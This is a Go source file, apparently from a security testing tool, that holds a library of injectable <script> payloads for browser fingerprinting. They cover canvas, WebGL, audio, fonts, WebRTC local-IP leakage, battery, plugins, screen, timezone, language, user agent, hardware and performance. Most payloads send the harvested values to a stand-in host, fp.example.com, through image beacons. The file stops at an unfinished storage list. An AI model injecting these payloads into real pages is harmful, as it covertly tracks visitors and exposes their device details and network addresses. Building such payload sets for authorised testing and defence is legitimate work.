package payload

var fingerprintCanvas = []Payload{
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('Cwm fjordbank glyphs vext quiz',2,15);var d=c.toDataURL();new Image().src='//fp.example.com/c?d='+encodeURIComponent(d);</script>`, Description: "Canvas-文字渲染", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=16;c.height=16;var ctx=c.getContext('2d');ctx.fillStyle='rgba(255,0,0,0.5)';ctx.fillRect(0,0,8,8);ctx.fillStyle='rgba(0,0,255,0.5)';ctx.fillRect(8,0,8,8);ctx.fillStyle='rgba(0,255,0,0.5)';ctx.fillRect(0,8,8,8);ctx.fillStyle='rgba(255,255,0,0.5)';ctx.fillRect(8,8,8,8);var d=c.toDataURL();</script>`, Description: "Canvas-色彩块RGBA", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=100;c.height=30;var ctx=c.getContext('2d');var txt='BrowserLeaks.com,Canvas 2.0';ctx.font='10px sans-serif';ctx.fillText(txt,2,15);ctx.fillStyle='#f00';ctx.fillText(txt,4,17);var d=c.toDataURL();</script>`, Description: "Canvas-缩放检测", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=300;c.height=20;var ctx=c.getContext('2d');ctx.font='14px Arial';ctx.fillText('Cwm fjordbank glyphs',2,15);var hash=0,data=c.toDataURL();for(var i=0;i<data.length;i++){hash=((hash<<5)-hash)+data.charCodeAt(i);hash|=0;}new Image().src='//fp.example.com/?h='+hash;</script>`, Description: "Canvas-文字哈希", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=220;c.height=30;var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.textBaseline='alphabetic';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('Canvas Fingerprint 2024',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Canvas Fingerprint 2024',4,17);var d=c.toDataURL();</script>`, Description: "Canvas-标准渲染测试", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');var ctx=c.getContext('2d');var txt='\ud83d\ude03\u2728\ud83c\udf89';c.width=ctx.measureText(txt).width+10;c.height=30;ctx.font='16px serif';ctx.fillStyle='#000';ctx.fillText(txt,2,20);var d=c.toDataURL();new Image().src='//fp.example.com/emoji?d='+encodeURIComponent(d.substring(0,50));</script>`, Description: "Canvas-Emoji渲染", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.font='16px Arial';ctx.fillStyle='#444';ctx.fillText('Signature',10,20);ctx.strokeStyle='#888';ctx.strokeText('Signature',12,22);var d=c.toDataURL();</script>`, Description: "Canvas-strokeText渲染", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=100;c.height=100;var ctx=c.getContext('2d');var grad=ctx.createLinearGradient(0,0,100,100);grad.addColorStop(0,'#f00');grad.addColorStop(0.5,'#0f0');grad.addColorStop(1,'#00f');ctx.fillStyle=grad;ctx.fillRect(0,0,100,100);var d=c.toDataURL();</script>`, Description: "Canvas-渐变渲染", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=150;c.height=150;var ctx=c.getContext('2d');ctx.fillStyle='#fff';ctx.fillRect(0,0,150,150);ctx.fillStyle='#000';ctx.beginPath();ctx.arc(75,75,50,0,2*Math.PI);ctx.fill();ctx.fillStyle='#fff';ctx.font='20px Arial';ctx.fillText('FP',55,80);var d=c.toDataURL();</script>`, Description: "Canvas-圆形+文字", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=40;var ctx=c.getContext('2d');ctx.font='18px "Times New Roman"';ctx.fillStyle='#222';ctx.fillText('abcdefghijklmnopqrstuvwxyz',5,25);var d=c.toDataURL();</script>`, Description: "Canvas-Times字体测试", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=40;var ctx=c.getContext('2d');ctx.font='18px "Courier New"';ctx.fillStyle='#333';ctx.fillText('0123456789ABCDEF',5,25);var d=c.toDataURL();</script>`, Description: "Canvas-Courier字体测试", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=250;c.height=60;var ctx=c.getContext('2d');ctx.font='20px Georgia';ctx.fillStyle='#111';ctx.fillText('The quick brown fox',10,30);ctx.globalAlpha=0.5;ctx.fillStyle='#f00';ctx.fillText('jumps over the lazy dog',10,50);var d=c.toDataURL();</script>`, Description: "Canvas-Georgia半透明", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=220;c.height=30;var ctx=c.getContext('2d');ctx.font='italic bold 14px Arial';ctx.fillStyle='#444';ctx.fillText('Italic Bold Test',5,20);var d=c.toDataURL();</script>`, Description: "Canvas-斜体粗体", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.fillStyle='#eee';ctx.fillRect(0,0,200,50);ctx.shadowColor='#000';ctx.shadowOffsetX=2;ctx.shadowOffsetY=2;ctx.shadowBlur=4;ctx.fillStyle='#f00';ctx.fillRect(50,10,100,30);var d=c.toDataURL();</script>`, Description: "Canvas-阴影渲染", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.save();ctx.translate(10,10);ctx.rotate(0.1);ctx.font='14px Arial';ctx.fillStyle='#555';ctx.fillText('Rotated Text',0,0);ctx.restore();var d=c.toDataURL();</script>`, Description: "Canvas-旋转变换", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.font='14px Arial';ctx.fillStyle='#333';ctx.fillText('Dot Matrix Test',5,20);var imgData=ctx.getImageData(0,0,1,1);var hash=imgData.data[0]*256+imgData.data[1];</script>`, Description: "Canvas-像素采样", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=300;c.height=60;var ctx=c.getContext('2d');ctx.font='12px Arial';for(var i=0;i<10;i++){ctx.fillStyle='rgb('+i*25+','+(255-i*20)+','+i*15+')';ctx.fillText('Canvas FP '+i,i*28,20+i*3);}var d=c.toDataURL();</script>`, Description: "Canvas-多彩文字", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=100;c.height=100;var ctx=c.getContext('2d');var imgData=ctx.createImageData(100,100);for(var i=0;i<imgData.data.length;i+=4){imgData.data[i]=i%255;imgData.data[i+1]=(i+50)%255;imgData.data[i+2]=(i+100)%255;imgData.data[i+3]=255;}ctx.putImageData(imgData,0,0);var d=c.toDataURL();</script>`, Description: "Canvas-ImageData操作", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=40;var ctx=c.getContext('2d');ctx.font='16px Arial';ctx.fillStyle='#000';ctx.fillText('Measuring width!',10,25);var w=ctx.measureText('Measuring width!').width;new Image().src='//fp.example.com/m?w='+w;</script>`, Description: "Canvas-measureText宽度", FPType: FingerprintCanvas},
	{Raw: `<script>var c=document.createElement('canvas');c.width=200;c.height=50;var ctx=c.getContext('2d');ctx.beginPath();ctx.moveTo(10,10);ctx.lineTo(190,10);ctx.lineTo(190,40);ctx.lineTo(10,40);ctx.closePath();ctx.clip();ctx.fillStyle='#f00';ctx.fillRect(0,0,200,50);var d=c.toDataURL();</script>`, Description: "Canvas-裁剪路径", FPType: FingerprintCanvas},
}

var fingerprintWebGL = []Payload{
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var d=gl.getExtension('WEBGL_debug_renderer_info');var gpu=gl.getParameter(37445);var vendor=gl.getParameter(37446);new Image().src='//fp.example.com/webgl?gpu='+encodeURIComponent(gpu)+'&vendor='+encodeURIComponent(vendor);}</script>`, Description: "WebGL-GPU信息", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);var data=new Float32Array([-0.2,-0.9,0,0.4,-0.26,0,0,0.73,0]);gl.bufferData(gl.ARRAY_BUFFER,data,gl.STATIC_DRAW);gl.clearColor(0,0,0,1);gl.clear(gl.COLOR_BUFFER_BIT);var ext=gl.getExtension('ANGLE_instanced_arrays');new Image().src='//fp.example.com/webgl2?e='+(ext?'1':'0');}</script>`, Description: "WebGL-ANGLE_instanced", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var maxTextureSize=gl.getParameter(gl.MAX_TEXTURE_SIZE);var maxViewportDims=gl.getParameter(gl.MAX_VIEWPORT_DIMS);var maxRenderbufferSize=gl.getParameter(gl.MAX_RENDERBUFFER_SIZE);var maxVertexAttribs=gl.getParameter(gl.MAX_VERTEX_ATTRIBS);var maxVaryVectors=gl.getParameter(gl.MAX_VARYING_VECTORS);new Image().src='//fp.example.com/webgl3?ts='+maxTextureSize+'&vd='+maxViewportDims[0]+'&rs='+maxRenderbufferSize+'&va='+maxVertexAttribs+'&vv='+maxVaryVectors;}</script>`, Description: "WebGL-全部参数", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var extensions=gl.getSupportedExtensions();new Image().src='//fp.example.com/webgl4?ext='+extensions.join(',');}</script>`, Description: "WebGL-扩展列表", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var shadingLanguageVersion=gl.getParameter(gl.SHADING_LANGUAGE_VERSION);var version=gl.getParameter(gl.VERSION);new Image().src='//fp.example.com/webgl5?v='+encodeURIComponent(version)+'&sv='+encodeURIComponent(shadingLanguageVersion);}</script>`, Description: "WebGL-版本信息", FPType: FingerprintWebGL},
	{Raw: "<script>var c=document.createElement('canvas');var gl=c.getContext('webgl2')||c.getContext('webgl');if(gl){var info={maxColorAttachments:gl.getParameter(gl.MAX_COLOR_ATTACHMENTS||36064),maxDrawBuffers:gl.getParameter(gl.MAX_DRAW_BUFFERS||34853)};new Image().src='//fp.example.com/webgl6?'+JSON.stringify(info);}</script>", Description: "WebGL2-参数信息", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');c.width=4;c.height=4;var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var vs='attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}';var fs='void main(){gl_FragColor=vec4(0.2,0.6,0.9,1);}';var v=gl.createShader(gl.VERTEX_SHADER);gl.shaderSource(v,vs);gl.compileShader(v);var f=gl.createShader(gl.FRAGMENT_SHADER);gl.shaderSource(f,fs);gl.compileShader(f);var prg=gl.createProgram();gl.attachShader(prg,v);gl.attachShader(prg,f);gl.linkProgram(prg);gl.useProgram(prg);gl.clearColor(0,0,0,0);gl.clear(gl.COLOR_BUFFER_BIT);gl.drawArrays(gl.TRIANGLES,0,3);var pixels=new Uint8Array(64);gl.readPixels(0,0,4,4,gl.RGBA,gl.UNSIGNED_BYTE,pixels);var hash=0;for(var i=0;i<64;i++){hash=((hash<<5)-hash)+pixels[i];hash|=0;}new Image().src='//fp.example.com/webgl7?h='+hash;</script>`, Description: "WebGL-渲染输出哈希", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var w_ext=gl.getExtension('WEBGL_draw_buffers');new Image().src='//fp.example.com/webgl8?wb='+(w_ext?'1':'0');}</script>`, Description: "WebGL-draw_buffers", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var ext=gl.getExtension('OES_texture_float');new Image().src='//fp.example.com/webgl9?tf='+(ext?'1':'0');}</script>`, Description: "WebGL-OES_texture_float", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var ext=gl.getExtension('OES_texture_half_float');var ext2=gl.getExtension('OES_vertex_array_object');new Image().src='//fp.example.com/webgl10?tf='+(ext?'1':'0')+'&vao='+(ext2?'1':'0');}</script>`, Description: "WebGL-多个扩展检测", FPType: FingerprintWebGL},
	{Raw: `<script>var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var ext=gl.getExtension('EXT_texture_filter_anisotropic');if(ext){var max=gl.getParameter(ext.MAX_TEXTURE_MAX_ANISOTROPY_EXT);new Image().src='//fp.example.com/webgl11?aniso='+max;}}</script>`, Description: "WebGL-各向异性过滤", FPType: FingerprintWebGL},
}

var fingerprintAudio = []Payload{
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var osc=ctx.createOscillator();var ana=ctx.createAnalyser();osc.type='triangle';osc.connect(ana);ana.connect(ctx.destination);osc.start(0);var freqData=new Uint8Array(ana.frequencyBinCount);ana.getByteFrequencyData(freqData);var hash=0;for(var i=0;i<freqData.length;i++){hash=((hash<<5)-hash)+freqData[i];hash|=0;}new Image().src='//fp.example.com/audio?h='+hash;</script>`, Description: "Audio-振荡器triangle", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var buf=ctx.createBuffer(1,44100,44100);var ch=buf.getChannelData(0);for(var i=0;i<44100;i++){ch[i]=Math.sin(2*Math.PI*440*i/44100);}var src=ctx.createBufferSource();src.buffer=buf;var proc=ctx.createScriptProcessor(4096,1,1);src.connect(proc);proc.connect(ctx.destination);</script>`, Description: "Audio-正弦波440Hz", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var osc=ctx.createOscillator();osc.type='square';var gain=ctx.createGain();gain.gain.value=0.1;osc.connect(gain);gain.connect(ctx.destination);osc.start();osc.stop(ctx.currentTime+0.1);</script>`, Description: "Audio-方波测试", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var sr=ctx.sampleRate;var bs=ctx.baseLatency;var os=ctx.outputLatency;new Image().src='//fp.example.com/audio2?sr='+sr+'&bl='+bs+'&ol='+os;</script>`, Description: "Audio-采样率参数", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var osc=ctx.createOscillator();osc.type='sawtooth';var dst=ctx.createMediaStreamDestination();osc.connect(dst);new Image().src='//fp.example.com/audio3?stream='+(dst.stream?'1':'0');</script>`, Description: "Audio-锯齿波+流", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var osc=ctx.createOscillator();osc.type='sine';osc.frequency.setValueAtTime(880,ctx.currentTime);var analyser=ctx.createAnalyser();osc.connect(analyser);var buf=new Float32Array(analyser.fftSize);analyser.getFloatTimeDomainData(buf);var hash=0;for(var i=0;i<100;i++){hash=((hash<<5)-hash)+(buf[i]*1000|0);hash|=0;}new Image().src='//fp.example.com/audio4?h='+hash;</script>`, Description: "Audio-880Hz sine分析", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var channels=ctx.destination.maxChannelCount;new Image().src='//fp.example.com/audio5?ch='+channels;</script>`, Description: "Audio-最大声道数", FPType: FingerprintAudio},
	{Raw: `<script>var ctx=new(window.AudioContext||window.webkitAudioContext)();var bits=16;if(ctx.destination){var props=Object.getOwnPropertyNames(ctx.destination.__proto__);}new Image().src='//fp.example.com/audio6?p='+props.length;</script>`, Description: "Audio-destination属性", FPType: FingerprintAudio},
}

var fingerprintFont = []Payload{
	{Raw: `<script>var fontList=['Arial','Verdana','Times New Roman','Courier New','Comic Sans MS','Impact','Georgia','Trebuchet MS','Helvetica','Tahoma','Lucida Console','Palatino Linotype','Book Antiqua','Garamond','Bookman Old Style','Century Gothic','Segoe UI','Calibri','Cambria','Candara','Constantia','Corbel','MS Sans Serif','MS Serif','Symbol','Webdings','Wingdings'];var baseFonts=['monospace','sans-serif','serif'];var testString='mmmmmmmmmmlli';var testSize='72px';var span=document.createElement('span');span.style.fontSize=testSize;span.innerHTML=testString;var defaultWidth={};for(var i in baseFonts){span.style.fontFamily=baseFonts[i];document.body.appendChild(span);defaultWidth[baseFonts[i]]=span.offsetWidth;document.body.removeChild(span);}var detected=[];for(var i in fontList){for(var j in baseFonts){span.style.fontFamily=fontList[i]+','+baseFonts[j];document.body.appendChild(span);if(span.offsetWidth!=defaultWidth[baseFonts[j]]){detected.push(fontList[i]);break;}document.body.removeChild(span);}}new Image().src='//fp.example.com/font?f='+detected.join(',');</script>`, Description: "字体-完整检测27种", FPType: FingerprintFont},
	{Raw: `<script>var testFonts=['Arial','Helvetica','Times','Palatino','Courier','Impact','Comic Sans'];var base='monospace';var s=document.createElement('span');s.style.fontSize='72px';s.innerHTML='mmmli';s.style.fontFamily=base;document.body.appendChild(s);var bw=s.offsetWidth;document.body.removeChild(s);var found=[];testFonts.forEach(function(f){s.style.fontFamily="'"+f+"',"+base;document.body.appendChild(s);if(s.offsetWidth!=bw){found.push(f);}document.body.removeChild(s);});</script>`, Description: "字体-快速7种检测", FPType: FingerprintFont},
	{Raw: `<script>var fonts=['Arial Black','Arial Narrow','Brush Script MT','Copperplate','Franklin Gothic Medium','Gill Sans','Lucida Sans','Monaco','Optima','Perpetua'];var detected=[];var span=document.createElement('span');span.style.fontSize='64px';span.innerHTML='abcdefgh';fonts.forEach(function(f){span.style.fontFamily=f+',monospace';document.body.appendChild(span);var w=span.offsetWidth;span.style.fontFamily='monospace';var w2=span.offsetWidth;if(w!=w2){detected.push(f);}document.body.removeChild(span);});</script>`, Description: "字体-额外10种检测", FPType: FingerprintFont},
	{Raw: `<script>var cjkFonts=['SimSun','NSimsun','FangSong','KaiTi','Microsoft YaHei','Microsoft JhengHei','Meiryo','MS Mincho','Malgun Gothic','Batang'];var base='serif';var s=document.createElement('span');s.style.fontSize='64px';s.innerHTML='\u6d4b\u8bd5\u5b57\u4f53';s.style.fontFamily=base;document.body.appendChild(s);var bw=s.offsetWidth;document.body.removeChild(s);var found=[];cjkFonts.forEach(function(f){s.style.fontFamily="'"+f+"',"+base;document.body.appendChild(s);if(s.offsetWidth!=bw){found.push(f);}document.body.removeChild(s);});</script>`, Description: "字体-CJK中文字体", FPType: FingerprintFont},
}

var fingerprintWebRTC = []Payload{
	{Raw: `<script>var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(e){if(!e.candidate)return;var ip=e.candidate.candidate.split(' ')[4];if(ip)new Image().src='//fp.example.com/ip?ip='+ip;};</script>`, Description: "WebRTC-本地IP泄露", FPType: FingerprintWebRTC},
	{Raw: `<script>var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o).then(function(){var sdp=pc.localDescription.sdp;new Image().src='//fp.example.com/webrtc?sdp='+encodeURIComponent(sdp);});});</script>`, Description: "WebRTC-SDP信息", FPType: FingerprintWebRTC},
	{Raw: `<script>var pc=new RTCPeerConnection();if(pc){var props=['createDataChannel','createOffer','setLocalDescription'];var support=props.map(function(p){return p+'='+(typeof pc[p]==='function'?'1':'0');}).join('&');new Image().src='//fp.example.com/rtc?'+support;}</script>`, Description: "WebRTC-API检测", FPType: FingerprintWebRTC},
	{Raw: `<script>try{var pc=new RTCPeerConnection({iceServers:[{urls:'turn:turn.example.com',username:'test',credential:'test'}]});new Image().src='//fp.example.com/rtc2?ok=1';}catch(e){new Image().src='//fp.example.com/rtc2?ok=0';}</script>`, Description: "WebRTC-TURN支持", FPType: FingerprintWebRTC},
	{Raw: `<script>var m=window.MediaStreamTrack;new Image().src='//fp.example.com/rtc3?mst='+(typeof m!=='undefined'?'1':'0');</script>`, Description: "WebRTC-MediaStream API", FPType: FingerprintWebRTC},
}

var fingerprintBattery = []Payload{
	{Raw: `<script>navigator.getBattery().then(function(b){new Image().src='//fp.example.com/battery?l='+Math.round(b.level*100)+'&c='+b.charging+'&t='+b.chargingTime+'&d='+b.dischargingTime;});</script>`, Description: "电池-完整信息", FPType: FingerprintBattery},
	{Raw: `<script>if('getBattery' in navigator){navigator.getBattery().then(function(b){new Image().src='//fp.example.com/ba2?l='+b.level+'&c='+b.charging;});}</script>`, Description: "电池-精简版", FPType: FingerprintBattery},
	{Raw: `<script>new Image().src='//fp.example.com/ba3?gb='+(typeof navigator.getBattery==='function'?'1':'0');</script>`, Description: "电池-API存在检测", FPType: FingerprintBattery},
}

var fingerprintPlugin = []Payload{
	{Raw: `<script>var plugins=[];for(var i=0;i<navigator.plugins.length;i++){plugins.push(navigator.plugins[i].name);}new Image().src='//fp.example.com/plugin?p='+encodeURIComponent(plugins.join(','));</script>`, Description: "插件-插件名称列表", FPType: FingerprintPlugin},
	{Raw: `<script>var mimes=[];for(var i=0;i<navigator.mimeTypes.length;i++){mimes.push(navigator.mimeTypes[i].type);}new Image().src='//fp.example.com/mime?m='+encodeURIComponent(mimes.join(','));</script>`, Description: "插件-MIME类型列表", FPType: FingerprintPlugin},
	{Raw: `<script>var pdftest=false;for(var i=0;i<navigator.plugins.length;i++){if(navigator.plugins[i].name.indexOf('Adobe')>=0||navigator.plugins[i].name.indexOf('PDF')>=0)pdftest=true;}new Image().src='//fp.example.com/plg2?pdf='+(pdftest?'1':'0');</script>`, Description: "插件-检测PDF插件", FPType: FingerprintPlugin},
	{Raw: `<script>var flash=false;for(var i=0;i<navigator.plugins.length;i++){if(navigator.plugins[i].name.indexOf('Flash')>=0||navigator.plugins[i].name.indexOf('Shockwave')>=0)flash=true;}new Image().src='//fp.example.com/plg3?flash='+(flash?'1':'0');</script>`, Description: "插件-检测Flash插件", FPType: FingerprintPlugin},
	{Raw: `<script>var quicktime=false;var java=false;for(var i=0;i<navigator.plugins.length;i++){var n=navigator.plugins[i].name;if(n.indexOf('QuickTime')>=0)quicktime=true;if(n.indexOf('Java')>=0)java=true;}new Image().src='//fp.example.com/plg4?qt='+(quicktime?'1':'0')+'&java='+(java?'1':'0');</script>`, Description: "插件-QT+Java检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/plg5?num='+navigator.plugins.length+'&mime='+navigator.mimeTypes.length;</script>`, Description: "插件-数量统计", FPType: FingerprintPlugin},
}

var fingerprintScreen = []Payload{
	{Raw: `<script>var sc=screen;var info={w:sc.width,h:sc.height,aw:sc.availWidth,ah:sc.availHeight,cd:sc.colorDepth,pd:sc.pixelDepth,dpr:window.devicePixelRatio||1,or:screen.orientation?screen.orientation.type:'unknown'};new Image().src='//fp.example.com/screen?'+Object.keys(info).map(function(k){return k+'='+info[k]}).join('&');</script>`, Description: "屏幕-完整信息", FPType: FingerprintScreen},
	{Raw: `<script>var info={w:screen.width,h:screen.height,cd:screen.colorDepth,dpr:window.devicePixelRatio};new Image().src='//fp.example.com/sc2?'+JSON.stringify(info);</script>`, Description: "屏幕-精简版", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/sc3?vw='+window.innerWidth+'&vh='+window.innerHeight+'&ow='+window.outerWidth+'&oh='+window.outerHeight;</script>`, Description: "屏幕-视口和窗口", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/sc4?sl='+screenLeft+'&st='+screenTop+'&sx='+scrollX+'&sy='+scrollY;</script>`, Description: "屏幕-屏幕位置", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/sc5?bar='+(window.toolbar?window.toolbar.visible:0)+'&menubar='+(window.menubar?window.menubar.visible:0)+'&status='+(window.statusbar?window.statusbar.visible:0);</script>`, Description: "屏幕-工具栏可见性", FPType: FingerprintScreen},
}

var fingerprintTimezone = []Payload{
	{Raw: `<script>var tz=Intl.DateTimeFormat().resolvedOptions().timeZone;var offset=new Date().getTimezoneOffset();new Image().src='//fp.example.com/tz?tz='+tz+'&offset='+offset;</script>`, Description: "时区-Intl API", FPType: FingerprintTimezone},
	{Raw: `<script>var d=new Date();new Image().src='//fp.example.com/tz2?tz='+d.getTimezoneOffset()+'&yr='+d.getFullYear()+'&hr='+d.getHours();</script>`, Description: "时区-offset+年月", FPType: FingerprintTimezone},
	{Raw: `<script>var tz=new Date().toString().split('(')[1].split(')')[0];new Image().src='//fp.example.com/tz3?tz='+encodeURIComponent(tz);</script>`, Description: "时区-Date.toString解析", FPType: FingerprintTimezone},
	{Raw: `<script>new Image().src='//fp.example.com/tz4?dt='+Date.now()+'&lz='+new Date(new Date().getFullYear(),0,1).getTimezoneOffset()+'&jz='+new Date(new Date().getFullYear(),6,1).getTimezoneOffset();</script>`, Description: "时区-夏令时检测", FPType: FingerprintTimezone},
}

var fingerprintLanguage = []Payload{
	{Raw: `<script>var lang=navigator.language||navigator.userLanguage;var langs=navigator.languages?navigator.languages.join(','):'';new Image().src='//fp.example.com/lang?l='+lang+'&ls='+langs;</script>`, Description: "语言-语言偏好", FPType: FingerprintLanguage},
	{Raw: `<script>var i18n=['language','region','script','calendar','numberingSystem','currency','dateStyle','timeStyle'];var info={};i18n.forEach(function(k){try{info[k]=JSON.stringify(Intl.DateTimeFormat().resolvedOptions());}catch(e){}});new Image().src='//fp.example.com/ln2?'+JSON.stringify(info);</script>`, Description: "语言-Intl详细配置", FPType: FingerprintLanguage},
}

var fingerprintUserAgent = []Payload{
	{Raw: `<script>var ua=navigator.userAgent;var platform=navigator.platform;var vendor=navigator.vendor;var cpu=navigator.cpuClass||navigator.oscpu||'';var mem=navigator.deviceMemory||'';var cores=navigator.hardwareConcurrency||'';new Image().src='//fp.example.com/ua?ua='+encodeURIComponent(ua)+'&platform='+encodeURIComponent(platform)+'&vendor='+encodeURIComponent(vendor)+'&mem='+mem+'&cores='+cores;</script>`, Description: "UA-设备信息完整版", FPType: FingerprintUserAgent},
	{Raw: `<script>new Image().src='//fp.example.com/ua2?ua='+encodeURIComponent(navigator.userAgent)+'&plat='+navigator.platform+'&ven='+navigator.vendor+'&prod='+navigator.product+'&sv='+navigator.productSub;</script>`, Description: "UA-产品信息", FPType: FingerprintUserAgent},
	{Raw: `<script>new Image().src='//fp.example.com/ua3?ua_len='+navigator.userAgent.length+'&app='+navigator.appName+'&ver='+navigator.appVersion;</script>`, Description: "UA-长度+app信息", FPType: FingerprintUserAgent},
	{Raw: `<script>var r=new RegExp('(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)/(\\d+)');var m=navigator.userAgent.match(r);new Image().src='//fp.example.com/ua4?br='+(m?m[1]:'other')+'&bv='+(m?m[2]:'0');</script>`, Description: "UA-浏览器解析", FPType: FingerprintUserAgent},
	{Raw: `<script>var isMobile=/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);new Image().src='//fp.example.com/ua5?mobile='+(isMobile?'1':'0')+'&touch='+(navigator.maxTouchPoints||0);</script>`, Description: "UA-设备类型检测", FPType: FingerprintUserAgent},
}

var fingerprintHardware = []Payload{
	{Raw: `<script>var info={cores:navigator.hardwareConcurrency||'unknown',mem:navigator.deviceMemory||'unknown',maxTouch:navigator.maxTouchPoints||0,connection:navigator.connection?navigator.connection.effectiveType:'unknown'};new Image().src='//fp.example.com/hw?c='+info.cores+'&m='+info.mem+'&t='+info.maxTouch+'&n='+info.connection;</script>`, Description: "硬件-设备性能", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.connection){var c=navigator.connection;var info={type:c.effectiveType,rtt:c.rtt,downlink:c.downlink,saveData:c.saveData};new Image().src='//fp.example.com/hw2?'+JSON.stringify(info);}</script>`, Description: "硬件-网络连接信息", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/hw3?bt='+(navigator.bluetooth?'1':'0')+'&usb='+(navigator.usb?'1':'0')+'&nfc='+(navigator.nfc?'1':'0')+'&hid='+(navigator.hid?'1':'0')+'&serial='+(navigator.serial?'1':'0');</script>`, Description: "硬件-外设API检测", FPType: FingerprintHardware},
}

var fingerprintPerformance = []Payload{
	{Raw: `<script>if(performance){var nav=performance.getEntriesByType('navigation')[0];var res=performance.getEntriesByType('resource');new Image().src='//fp.example.com/perf?n='+JSON.stringify(nav)+'&rc='+res.length;}</script>`, Description: "性能-Performance Nav", FPType: FingerprintScreen},
	{Raw: `<script>if(performance&&performance.memory){var m=performance.memory;new Image().src='//fp.example.com/perf2?total='+m.totalJSHeapSize+'&used='+m.usedJSHeapSize+'&limit='+m.jsHeapSizeLimit;}</script>`, Description: "性能-JS内存信息", FPType: FingerprintHardware},
	{Raw: `<script>var t=performance.timing;if(t){var load=t.loadEventEnd-t.navigationStart;var dom=t.domComplete-t.domLoading;new Image().src='//fp.example.com/perf3?load='+load+'&dom='+dom;}</script>`, Description: "性能-Nav Timing1", FPType: FingerprintScreen},
	{Raw: `<script>if(performance){new Image().src='//fp.example.com/perf4?tl='+performance.timing.loadEventEnd+'&rt='+(performance.timeOrigin||0);}</script>`, Description: "性能-timeOrigin", FPType: FingerprintScreen},
}

var fingerprintStorage = []Payload{
